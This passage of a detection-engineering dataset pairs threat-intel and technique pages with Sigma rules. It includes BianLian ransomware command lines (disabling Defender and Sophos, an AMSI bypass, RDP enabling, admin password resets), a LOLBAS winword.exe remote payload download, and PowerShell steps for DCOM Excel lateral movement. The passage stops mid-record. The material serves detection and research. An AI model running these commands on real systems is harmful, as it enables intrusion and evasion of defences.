|\n| 66.135.0[.]42     | Early April    |\n| 83.136.180[.]12   | Early June     |\n| 85.13.117[.]213   | Late August    |\n| 85.13.117[.]218   | Late August    |\n| 91.199.209[.]20   | Mid July       |\n| 95.179.137[.]20   | Late July      |\n\n#### Historical C2s\n\n| IP Address        | First Seen    | Last Seen    |\n| ----------------- | ------------- | ------------ |\n| 104.207.155[.]133 | Early July    | Early August |\n| 104.238.61[.]153  | *             |              |\n| 146.70.44[.]248   | *             |              |\n| 155.94.160[.]241  | Late July     | Early August |\n| 167.88.15[.]98    | Early August  | Late August  |\n| 172.96.137[.]107  | Early August  | Mid August   |\n| 188.166.81[.]141  | Early May     | Late August  |\n| 194.26.29[.]131   | Early August  | Late August  |\n| 194.5.212[.]205   | Early August  | Mid August   |\n| 194.58.119[.]159  | Late May      | Early June   |\n| 198.252.108[.]34  | *             |              |\n| 202.66.72[.]7     | Mid August    | Late August  |\n| 208.123.119[.]145 | Late April    | Late April   |\n| 209.141.54[.]205  | Early August  | Mid August   |\n| 23.227.198[.]243  | *             |              |\n| 23.94.56[.]154    | Late December | Early August |\n| 43.155.116[.]250  | Mid August    | Mid August   |\n| 45.144.30[.]139   | Mid April     | Early June   |\n| 45.92.156[.]105   | *             |              |\n| 5.188.6[.]118     | Early August  | Late August  |\n| 5.230.67[.]2      | Early August  | Late August  |\n| 85.13.116[.]194   | Mid August    | Late August  |\n| 85.13.117[.]219   | Early August  | Late August  |\n| 89.22.224[.]3     | Early August  | Late August  |\n\n* These IPs were found in instances of BianLian’s backdoor, but we lack visibility on the timeframe(s) when the IPs may have been active.\n\n### Observed Command Lines\n\n- `\"C:\\Windows\\system32\\Dism.exe\" /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart`\n- `\"C:\\Windows\\system32\\net.exe\" localgroup \"Remote Desktop Users\" <similar name to existing admin> /add`\n- `\"C:\\Windows\\system32\\net.exe\" user <legitimate admin account> 3gDZNxtsQ9G029k7D6Ljxe /domain`\n- `\"C:\\Windows\\system32\\netsh.exe\" advfirewall firewall set rule \"group=remote desktop\" new enable=Yes`\n- `\"C:\\Windows\\system32\\netsh.exe\" advfirewall firewall add rule \"name=allow RemoteDesktop\" dir=in * protocol=TCP localport=3389 action=allow`\n- `\"C:\\Windows\\system32\\reg.exe\" add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /* v fAllowToGetHelp /t REG_DWORD /d 1 /f`\n- `\"C:\\Windows\\system32\\reg.exe\" add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal * Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f`\n- `\"C:\\Windows\\system32\\reg.exe\" ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Sophos Endpoint * Defense\\TamperProtection\\Config\" /t REG_DWORD /v SAVEnabled /d 0 /f`\n- `\"C:\\Windows\\system32\\reg.exe\" ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Sophos Endpoint * Defense\\TamperProtection\\Config\" /t REG_DWORD /v SEDEnabled /d 0 /f`\n- `\"C:\\Windows\\system32\\reg.exe\" ADD * HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Sophos\\SAVService\\TamperProtection /t REG_DWORD /v Enabled /d 0 /* f`\n- `\"C:\\Windows\\system32\\reg.exe\" copy hklm\\system\\CurrentControlSet\\services\\tvnserver * hklm\\system\\CurrentControlSet\\control\\safeboot\\network\\tvnserver /s /f`\n- `\\cmd.exe /Q /c net user \"Administrator\" /active:yes 1&gt; \\\\127.0.0.1\\C$\\Windows\\Temp\\abjAlC 2&gt;&amp;1`\n- `cmd.exe /Q /c net user \"Administrator\" ChangeMe2morrow! 1&gt; \\\\127.0.0.1\\C$\\Windows\\Temp\\OxNEcz 2&gt;&amp;1`\n- `cmd.exe /Q /c quser 1&gt; \\\\127.0.0.1\\C$\\Windows\\Temp\\VXPrvY 2&gt;&amp;1`\n- `\"C:\\Windows\\system32\\PING.EXE\" -4 -n 1 *`\n- `[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,* Static’).SetValue($null,$true)`\n\n### MITRE ATT&CK Techniques\n\n| ID        | Technique                                                           |\n| --------- | ------------------------------------------------------------------- |\n| T1190     | Initial Access: Exploit Public-Facing Application                   |\n| T1047     | Execution: Windows Management Instrumentation                       |\n| T1059.001 | Execution: Command and Scripting Interpreter: PowerShell            |\n| T1098     | Persistence: Account Manipulation                                   |\n| T1078     | Persistence: Valid Accounts                                         |\n| T1562.001 | Defense Evasion: Impair Defenses: Disable or Modify Tools           |\n| T1526.004 | Defense Evasion: Impair Defenses: Disable or Modify System Firewall |\n| T1036     | Defense Evasion: Masquerading                                       |\n| T1112     | Defense Evasion: Modify Registry                                    |\n| T1069     | Discovery: Permission Groups Discovery                              |\n| T1018     | Discovery: Remote System Discovery                                  |\n| T1021.001 | Lateral Movement: Remote Services: Remote Desktop Protocol          |\n| T1021.005 | Lateral Movement: Remote Services: VNC                              |\n| T1021.006 | Lateral Movement: Remote Services: Windows Remote Management        |\n| T1090     | Command and Control: Proxy                                          |\n| T1071.001 | Command and Control: Application Layer Protocol: Web Protocol       |\n| T1486     | Impact: Data Encrypted for Impact                                   |\n\n### Tools For Researchers\n\nDuring our research, we created some tool modifications for the AlphaGolang project to assist other security community researchers in working on the BianLian malware. The specific update is located here.\n\n---\n\n**Tags:**\n- Threat Intelligence",
    "sigma_rule": {
      "title": "Suspicious Manipulation Of Default Accounts Via Net.EXE",
      "id": "5b768e71-86f2-4879-b448-81061cbae951",
      "status": "test",
      "description": "Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc",
      "references": [
        "https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html",
        "https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/",
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-01",
      "modified": "2023-02-21",
      "tags": [
        "attack.collection",
        "attack.t1560.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_user_option": {
          "CommandLine|contains": " user "
        },
        "selection_username": {
          "CommandLine|contains": [
            " Järjestelmänvalvoja ",
            " Rendszergazda ",
            " Администратор ",
            " Administrateur ",
            " Administrador ",
            " Administratör ",
            " Administrator ",
            " guest ",
            " DefaultAccount ",
            " \"Järjestelmänvalvoja\" ",
            " \"Rendszergazda\" ",
            " \"Администратор\" ",
            " \"Administrateur\" ",
            " \"Administrador\" ",
            " \"Administratör\" ",
            " \"Administrator\" ",
            " \"guest\" ",
            " \"DefaultAccount\" ",
            " 'Järjestelmänvalvoja' ",
            " 'Rendszergazda' ",
            " 'Администратор' ",
            " 'Administrateur' ",
            " 'Administrador' ",
            " 'Administratör' ",
            " 'Administrator' ",
            " 'guest' ",
            " 'DefaultAccount' "
          ]
        },
        "filter": {
          "CommandLine|contains|all": [
            "guest",
            "/active no"
          ]
        },
        "condition": "all of selection_* and not filter"
      },
      "falsepositives": [
        "Some false positives could occur with the admin or guest account. It depends on the scripts being used by the admins in your env. If you experience a lot of FP you could reduce the level to medium"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_user_default_accounts_manipulation.yml",
    "id": "288"
  },
  {
    "url": "https://intel.thedfirreport.com/eventReports/view/57",
    "markdown": "",
    "sigma_rule": {
      "title": "Notepad Password Files Discovery",
      "id": "3b4e950b-a3ea-44d3-877e-432071990709",
      "status": "experimental",
      "description": "Detects the execution of Notepad to open a file that has the string \"password\" which may indicate unauthorized access to credentials or suspicious activity.",
      "references": [
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/",
        "https://intel.thedfirreport.com/eventReports/view/57"
      ],
      "author": "The DFIR Report",
      "tags": [
        "attack.discovery",
        "attack.t1083"
      ],
      "date": "2025-02-21",
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\explorer.exe",
          "Image|endswith": "\\notepad.exe",
          "CommandLine|endswith": [
            "password*.txt",
            "password*.csv",
            "password*.doc",
            "password*.xls"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of opening files from remote hosts by administrators or users. However, storing passwords in text readable format could potentially be a violation of the organization's policy. Any match should be investigated further."
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_notepad_local_passwd_discovery.yml",
    "id": "295"
  },
  {
    "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731620(v=ws.11)",
    "markdown": "# snapshot\n\n**Applies To**: Windows Server 2008, Windows Server 2012, Windows 8\n\nManages snapshots of the volumes that contain the Active Directory database and log files, which you can view on a domain controller without starting in Directory Services Restore Mode (DSRM). You can also run the snapshot subcommand on an Active Directory Lightweight Directory Services (AD LDS) server.\n\nIn the command-line tool Ntdsutil.exe, you can use the snapshot subcommand to manage the snapshots, but you must use Dsamain.exe to expose the snapshot as a Lightweight Directory Access Protocol (LDAP) server. For more information about using Dsamain, see Dsamain).\n\nThis is a subcommand of Ntdsutil and Dsdbutil. Ntdsutil and Dsdbutil are command-line tools that are built into Windows Server 2008 and Windows Server 2008 R2. Ntdsutil is available if you have the Active Directory Domain Services (AD DS) or AD LDS server role installed. Dsdbutil is available if you have the AD LDS server role installed. These tools are also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT). For more information, see How to Administer Microsoft Windows Client and Server Computers Locally and Remotely (https://go.microsoft.com/fwlink/?LinkID=177813).\n\nTo use either of these tools, you must run them from an elevated command prompt. To open an elevated command prompt, click **Start**, right-click **Command Prompt**, and then click **Run as administrator**.\n\nFor examples of how to use this command, see Examples.\n\n## Syntax\n\n```\nactivate instance %s [create] [delete %s] [unmount %s] [list all] [list mounted ] [mount %s] [quit]\n```\n\n## Parameters\n\n| Parameter              | Description                                                                                                                                 |\n|------------------------|---------------------------------------------------------------------------------------------------------------------------------------------|\n| `activate instance %s`  | Sets an active instance for the command. You can either specify \"ntds\" to set AD DS as the active instance or you can specify the name of an AD LDS instance. |\n| `create`               | Creates a snapshot.                                                                                                                         |\n| `delete %s`            | Deletes a snapshot with globally unique identifier (GUID) %s. Use `*` to delete all snapshots.                                               |\n| `list all`             | Lists all mounted snapshots. You can run this command to obtain an index number for a mounted snapshot. You can then use the index number, instead of a GUID, to mount or unmount a snapshot. |\n| `list mounted`         | Lists mounted snapshots. You can run this command to obtain an index number for a mounted snapshot. You can then use the index number instead of a GUID to mount or unmount a snapshot. |\n| `mount %s`             | Mounts a snapshot with GUID %s. You can refer to an index number of any mounted snapshot instead of its GUID.                                |\n| `unmount %s`           | Unmounts a snapshot with GUID %s. Use `*` to unmount all mounted snapshots.                                                                  |\n| `quit`                 | Returns to the prior menu.                                                                                                                  |\n| `Help`                 | Displays Help for this command.                                                                                                             |\n| `?`                    | Displays Help for this command.                                                                                                             |\n\n## Remarks\n\n- Before you can run the **snapshot** subcommand, you must run the **activate instance** subcommand in Ntdsutil to set an active instance. For examples of how to set an active instance, see Examples.\n- You are not required to run the **snapshot** subcommand to use Dsamain.exe. Instead, you can use a backup of the AD DS or AD LDS database or another domain controller or AD LDS server. Running the **snapshot** subcommand simply provides convenient data input for Dsamain.exe.\n- You should protect snapshots in a manner that is similar to how you protect domain controller backups. For example, use encryption or other data security precautions with AD DS snapshots to help mitigate the chance of unauthorized access to them.\n- When you use Dsamain.exe to expose the data that is contained in a snapshot:\n  - All permissions that apply to the data in the snapshot are enforced.\n  - By default, only members of the Domain Admins group and the Enterprise Admins group are allowed to view a snapshot because it can contain sensitive AD DS data.\n- Ntdsutil does not correctly handle special characters, such as the apostrophe character ('), that you can enter at the **ntdsutil:** prompt at the command line. In some situations, there may be an alternative workaround. For more information, see local roles.\n\n## Examples\n\nThe following example sets NTDS as the active instance:\n\n```\nntdsutil: activate instance ntds\n```\n\nThe following example is another way to set NTDS as the active instance:\n\n```\nntdsutil: ac in ntds\n```\n\nThe following example mounts a snapshot that has the GUID `8ec8ff74-c0d7-435a-b6b1-54ef185926be`:\n\n```\nsnapshot: mount {8ec8ff74-c0d7-435a-b6b1-54ef185926be}\n```\n\nThe following example unmounts the same snapshot:\n\n```\nsnapshot: unmount {8ec8ff74-c0d7-435a-b6b1-54ef185926be}\n```\n\nThe following example lists the mounted snapshots:\n\n```\nsnapshot: list mounted\n```\n\n## Additional references\n\n- Command-Line Syntax Key)\n- Dsamain)\n- Dsdbutil)\n- Ntdsutil)\n- authoritative restore)\n- configurable settings)\n- DS behavior)\n- files)\n- group membership evaluation)\n- ifm)\n- LDAP policies)\n- local roles)\n- metadata cleanup)\n- partition management)\n- roles)\n- security account management)\n- semantic database analysis)\n- set DSRM password)",
    "sigma_rule": {
      "title": "Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)",
      "id": "a58353df-af43-4753-bad0-cd83ef35eef5",
      "related": [
        {
          "id": "2afafd61-6aae-4df4-baed-139fa1f4c345",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc.",
      "references": [
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731620(v=ws.11)",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-14",
      "tags": [
        "attack.credential-access",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\ntdsutil.exe"
          },
          {
            "OriginalFileName": "ntdsutil.exe"
          }
        ],
        "selection_cli": [
          {
            "CommandLine|contains|all": [
              "snapshot",
              "mount "
            ]
          },
          {
            "CommandLine|contains|all": [
              "ac",
              " i",
              " ntds"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate usage to restore snapshots",
        "Legitimate admin activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ntdsutil_susp_usage.yml",
    "id": "297"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
    "markdown": "# /Winword.exe\n\nMicrosoft Office binary\n\n### Paths:\n- C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe\n- C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\winword.exe\n- C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\winword.exe\n- C:\\Program Files (x86)\\Microsoft Office\\Office16\\winword.exe\n- C:\\Program Files\\Microsoft Office\\Office16\\winword.exe\n- C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\winword.exe\n- C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\winword.exe\n- C:\\Program Files (x86)\\Microsoft Office\\Office15\\winword.exe\n- C:\\Program Files\\Microsoft Office\\Office15\\winword.exe\n- C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\winword.exe\n- C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\winword.exe\n- C:\\Program Files (x86)\\Microsoft Office\\Office14\\winword.exe\n- C:\\Program Files\\Microsoft Office\\Office14\\winword.exe\n- C:\\Program Files (x86)\\Microsoft Office\\Office12\\winword.exe\n- C:\\Program Files\\Microsoft Office\\Office12\\winword.exe\n- C:\\Program Files\\Microsoft Office\\Office12\\winword.exe\n\n### Resources:\n- https://twitter.com/reegun21/status/1150032506504151040\n- https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191\n\n### Detections:\n- Sigma: proc_creation_win_office_arbitrary_cli_download.yml\n- IOC: Suspicious Office application Internet/network traffic\n\n## Download\n\n1. Downloads payload from remote server\n\n   ```\n   winword.exe \"http://192.168.1.10/TeamsAddinLoader.dll\"\n   ```\n\n   **Use case**:\n   It will download a remote payload and place it in INetCache.\n\n   **Privileges required**:\n   User\n\n   **Operating systems**:\n   Windows\n\n   **ATT&CK® technique**:\n   T1105: Ingress Tool Transfer\n\n   **Tags**:\n   Download: INetCache\n   INetCache downloaders typically store files in a randomly-named folder under `%LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE`, having added `[1]` or a higher number between the file's name and its extension.\n   If you downloaded a file named `XYZ.exe`, the full path of the downloaded file can be obtained by executing the following command:\n\n   ```\n   cmd.exe /c \"where /r %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache XYZ*\"\n   ```",
    "sigma_rule": {
      "title": "Potential Arbitrary File Download Using Office Application",
      "id": "4ae3e30b-b03f-43aa-87e3-b622f4048eed",
      "related": [
        {
          "id": "0c79148b-118e-472b-bdb7-9b57b444cc19",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potential arbitrary file download using a Microsoft Office application",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
        "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Beyu Denis, oscd.community",
      "date": "2022-05-17",
      "modified": "2023-06-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\WINWORD.exe"
            ]
          },
          {
            "OriginalFileName": [
              "Excel.exe",
              "POWERPNT.EXE",
              "WinWord.exe"
            ]
          }
        ],
        "selection_http": {
          "CommandLine|contains": [
            "http://",
            "https://"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_arbitrary_cli_download.yml",
    "id": "315"
  },
  {
    "url": "https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922",
    "markdown": "# Lateral Movement: Abuse the Power of DCOM Excel Application\n\nIn this post, we will talk about an interesting lateral movement technique called *ActivateMicrosoftApp()* method within the distributed component object model (DCOM) Excel application. This technique is built upon Matt Nelson's initial research on “Lateral Movement using Excel.Application and DCOM”.\n\n## What is DCOM?\n\nDCOM is a Microsoft solution that allows software components to communicate remotely. Its predecessor, component object model (COM), lacked distributed computing functionality, so Microsoft introduced DCOM to serve the need of software components to communicate across the network. Basically, DCOM allows a client application to remotely instantiate a COM server object on another machine and utilize its methods. It operates on top of the remote procedure call (RPC) transport protocol based on TCP/IP for its network communications; specifically, it uses the `ncacn_ip_tcp` protocol sequence, where:\n\n- `ncacn` stands for \"Connection-Oriented Network Computing Architecture.\"\n- `ip_tcp` specifies the use of TCP/IP.\n\nIn practical terms, when you see this protocol sequence, it indicates that RPC is using TCP/IP for network communications in a connection-oriented manner.\n\n## How does COM work?\n\nCOM objects must be configured properly on both client and server. The Windows Registry stores the DCOM configuration data in three identifiers:\n\n- **CLSID** — The class identifier (CLSID) is a global unique identifier (GUID) which represents a unique ID for any application components in Windows; an example of CLSID is “{00020812–0000–0000-C000–000000000046}”\n- **ProgID** — The program identifier (ProgID) is an optional identifier registry entry which is linked to CLSID; unlike CLSID, ProgID is not a complex GUID format but a human readable format like “Excel.Application”\n- **APPID** — The application identifier (AppID) identifies all the classes that are part of the same executable and the permissions required to access it; it will most likely throw an error if the correct AppID is not used\n\nThe basic flow of communication is like this:\n\n```image\nAlt: Figure 01 — DCOM flow over the network\nDescription: The image illustrates the flow of communication in the DCOM (Distributed Component Object Model) process, detailing interactions between a client and an application server. It includes labeled steps that outline the process of requesting an object creation using CLSID, ProgID, or AppID, permission checks, and the initiation of an instance via DCOMLaunch.exe or DLLHost.exe. Additionally, it features graphical icons representing a client computer, an application server, the Windows Registry, and system processes like svchost.exe, providing a clear visual representation of the DCOM architecture.\nTranscription: |\n  Client\n  (1) Request to create an object via CLSID, PROGID or APPID\n  (4) Access to all function and methods over RPC\n  \n  Application Server\n  (2) Checks for permission to create an object\n  (3) Start the instance using DCOMLaunch.exe or DLLHost.exe\n  \n  Windows Registry\n  svchost.exe\n```\n\n1. To create an object on the remote computer, the client provides a request with the CLSID, PROGID or APPID\n2. The remote machine performs a validation to determine whether it has permission to create an object (i.e., requires administrator privileges)\n3. If the remote machine has the correct permissions, it will use DCOMLaunch.exe or DLLHOST.exe and start the instance\n4. After successful communication, the client will have access to all the functions and methods on the remote computer\n\nThis was a quick overview of DCOM to learn more read here.\n\n## DCOM Exploitation Using Excel’s ActivateMicrosoftApp() Method\n\nBefore we begin, there are some prerequisites for this attack:\n\n- Requires local admin privilege on the target\n- Requires Microsoft Excel installed on the target\n- Ability to remotely write a file in the system *PATH*\n- Tested on Windows 10 and 11\n- Tested on 64-bit installation of Office 365\n\nWhile enumerating different methods of Excel objects, we discovered the **ActivateMicrosoftApp()** method could be used to get shell access because Microsoft still supports activation of some end of life (EOL) software such as FoxPro, Schedule Plus, and Office Project. It is unlikely that any of these legacy applications will be installed on modern environments, but we could abuse this vulnerability for lateral movement and persistence techniques.\n\n```image\nAlt: Figure 02 — Excel’s DCOM methods\nDescription: The image displays a PowerShell command output showing the properties and methods of a COM object created from Excel's application type. It specifically highlights the 'ActivateMicrosoftApp' method, which is crucial for exploiting DCOM through Excel for lateral movement in a cyber attack. The output lists various methods associated with the Excel COM object, indicating the potential for automation and manipulation of Excel functionalities.\nTranscription: |\n  PS C:\\Users\\User\\Desktop> $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"localhost\"))\n  PS C:\\Users\\User\\Desktop> $com | Get-Member\n  \n  TypeName: System.__ComObject{000208d5-0000-0000-c000-000000000046}\n  \n  Name                              MemberType    Definition\n  ----                              ----------    ----------\n  ActivateMicrosoftApp              Method        void ActivateMicrosoftApp (XLMSApplication)\n  AddChartAutoFormat                Method        void AddChartAutoFormat (Variant, string, Vari...\n  AddCustomList                     Method        void AddCustomList (Variant, Variant)\n  Calculate                         Method        void Calculate()\n  CalculateFull                     Method        void CalculateFull()\n  CalculateFullRebuild              Method        void CalculateFullRebuild()\n  CalculateUntilAsyncQueriesDone    Method        void CalculateUntilAsyncQueriesDone()\n  CentimetersToPoints               Method        double CentimetersToPoints (double)\n  CheckAbort                        Method        void CheckAbort (Variant)\n  CheckSpelling                     Method        void CheckSpelling (String, Variant)\n  ConvertFormula                    Method        Variant ConvertFormula (Variant, XLReferenceSt...\n  DDEExecute                        Method        void DDEExecute (int, string)\n```\n\nAccording to Microsoft’s documentation, the **ActivateMicrosoftApp()** method activates a Microsoft application. If this application is already running, this method activates the running application. If the application is not running, this method starts a new instance of the application as the launching user or the currently logged on user based on how DCOM was configured. The **ActivateMicrosoftApp()** method takes one parameter which specifies the Microsoft application to activate.\n\n```image\nAlt: Figure 03 — ActivateMicrosoftApp() method parameters\nDescription: The image contains a table that lists various Microsoft applications along with their corresponding values and descriptions. The applications included are Microsoft FoxPro, Microsoft Project, Microsoft Schedule Plus, Microsoft Access, Microsoft Mail, Microsoft PowerPoint, and Microsoft Word. Each application is associated with a specific numerical value, which is significant in the context of exploiting the DCOM activation method in Excel to gain unauthorized access.\nTranscription: |\n  | Name                    | Value | Description                 |\n  | ----------------------- | ----- | --------------------------- |\n  | xlMicrosoftAccess       | 4     | Microsoft Office Access     |\n  | xlMicrosoftFoxPro       | 5     | Microsoft FoxPro            |\n  | xlMicrosoftMail         | 3     | Microsoft Office Outlook    |\n  | xlMicrosoftPowerPoint   | 2     | Microsoft Office PowerPoint |\n  | xlMicrosoftProject      | 6     | Microsoft Office Project    |\n  | xlMicrosoftSchedulePlus | 7     | Microsoft Schedule Plus     |\n  | xlMicrosoftWord         | 1     | Microsoft Office Word       |\n```\n\nWhen this method is invoked, it scans the system *PATH* to run the associated binary. For instance, if we provide the value “5,” which corresponds to Microsoft’s FoxPro application, the **ActivateMicrosoftApp()** method will seek the *FOXPROW.exe* binary within the system *PATH*.\n\n```image\nAlt: Figure 04 — Error thrown if executable not found\nDescription: The image is a screenshot of a PowerShell terminal displaying an error message. It shows a command attempting to activate the Microsoft Excel application using the ActivateMicrosoftApp() method with the parameter '5'. The error message indicates that it cannot run 'FOXPROW.EXE', stating that the program or one of its components is damaged or missing. Additional details about the error are provided, including the category info and a fully qualified error ID.\nTranscription: |\n  PS C:\\Users\\User\\Desktop> $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"localhost\"))\n  PS C:\\Users\\User\\Desktop> $com.ActivateMicrosoftApp(\"5\")\n  Cannot run 'FOXPROW.EXE'. The program or one of its components is damaged or missing.\n  At line:1 char:1\n  + $com.ActivateMicrosoftApp(\"5\")\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : OperationStopped: (:) [], COMException\n      + FullyQualifiedErrorId : System.Runtime.InteropServices.COMException\n  PS C:\\Users\\User\\Desktop> |\n```\n\nHowever, if the application is not present on the system **ActivateMicrosoftApp()** will throw an error that it “Cannot run ‘*FOXPROW.exe*’. The program or one of its components is damaged or missing.” After some research, we utilized Process Monitor to further investigate underlying operations.\n\n```image\nAlt: Figure 05 — Attempt to find the FOXPROW.exe in system PATH\nDescription: The image is a screenshot from Process Monitor displaying logs related to an attempt by the Excel process (EXCEL.EXE) to create or locate the executable file 'FOXPROW.EXE' in various directories within the Windows operating system. The logs detail the timestamps, process ID, operation type ('CreateFile'), and the file paths being accessed. Many of the entries indicate that the 'FOXPROW.EXE' file is not found, highlighting the absence of this legacy application on the system.\nTranscription: |\n  7:41:30... EXCEL.EXE  7376  CreateFile  C:\\Program Files\\Microsoft Office\\Office16\\FOXPROW.EXE\n  7:41:30... EXCEL.EXE  7376  CreateFile  C:\\Windows\\System32\\FOXPROW.EXE\n  7:41:30... EXCEL.EXE  7376  CreateFile  C:\\Windows\\System\\FOXPROW.EXE\n  7:41:30... EXCEL.EXE  7376  CreateFile  C:\\Windows\\FOXPROW.EXE\n  7:41:30... EXCEL.EXE  7376  CreateFile  C:\\Windows\\System32\\Web\\FOXPROW.EXE\n  7:41:30... EXCEL.EXE  7376  CreateFile  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\FOXPROW.EXE\n  7:41:30... EXCEL.EXE  7376  CreateFile  C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC...\n  7:41:30... EXCEL.EXE  7376  CreateFile  C:\\Program Files\\dotnet\\FOXPROW.EXE\n  7:41:30... EXCEL.EXE  7376  CreateFile  C:\\Users\\User\\AppData\\Local\\Microsoft\\WindowsApps\\FOXPROW.EXE\n```\n\nThe *Excel.exe* process attempted to locate the *FOXPROW.exe* binary file within the system *PATH*; however, since the application is not installed, it returned an error instead. In order to abuse this, we have to identify write permissions within the system *PATH*. The location where users most commonly have write permission to the *PATH* is:\n\n```\nC:\\users\\*\\AppData\\Local\\Microsoft\\WindowsApps\\\n```\n\nThe FoxPro application is no longer supported since January 2010, and it is unlikely to exist on any modern environment. So, if we manage to upload a malicious binary with the name “FOXPROW.exe” and place it in the above folder, then our malicious binary will execute and provide us access to the target machine.\n\n```\ncopy c:\\windows\\system32\\calc.exe '\\\\192.168.49.160\\c$\\users\\user\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"192.168.49.160\"))\n\n$com.ActivateMicrosoftApp(\"5\")\n```\n\nIn certain situations, you may receive the below error due to the absence of Excel on the machine initiating the attack. The `GetTypeFromProgID` method looks for an associated CLSID in the registry of the local computer and if it is not able to map the ProgID to CLSID, the following error will occur:\n\n```image\nAlt: Figure 06 — Error thrown if ProgID could not map to CLSID\nDescription: The image shows a command-line interface with a PowerShell command attempting to create an instance of the Excel application using the `System.Activator::CreateInstance` method with the `GetTypeFromProgID` function. An error message is displayed indicating that there are \"multiple ambiguous overloads found for 'CreateInstance' and the argument count: '1'\". This suggests a problem with how the method is being called, specifically that it couldn't determine the correct method signature due to ambiguity in the provided parameters.\nTranscription: |\n  PS C:\\Users\\Administrator> $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"192.168.49.188\"))\n  Multiple ambiguous overloads found for \"CreateInstance\" and the argument count: \"1\".\n  At line:1 char:1\n  + $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\" ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (:), MethodException\n      + FullyQualifiedErrorId : 